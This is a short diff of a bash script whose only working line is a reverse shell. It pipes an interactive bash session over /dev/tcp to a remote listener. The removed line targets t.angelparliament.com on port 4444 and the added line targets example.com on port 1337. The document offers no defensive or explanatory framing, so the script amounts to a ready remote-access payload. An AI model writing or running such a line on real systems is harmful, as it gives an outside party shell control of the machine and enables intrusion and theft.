@@ -1,3 +1,3 @@
 #!/bin/bash
-bash -i >& /dev/tcp/t.angelparliament.com/4444 0>&1
+bash -i >& /dev/tcp/example.com/1337 0>&1
 wait
